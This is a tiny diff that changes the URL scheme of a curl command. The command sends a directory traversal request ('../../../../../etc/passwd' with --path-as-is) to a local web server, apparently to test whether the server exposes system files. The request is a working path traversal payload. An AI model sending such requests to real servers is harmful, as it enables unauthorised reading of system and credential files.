@@ -15,4 +15,4 @@ curl --path-as-is --request GET -k \
 -H "Accept: text/html, applicattion/xhtml+xml, application/xml;q=0.9,*/*;q=0.8" \
 -H "Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3" \
 -H "Connection: keep-alive" \
-"http://127.0.0.1:80/../../../../../etc/passwd"
+"https://127.0.0.1:80/../../../../../etc/passwd"
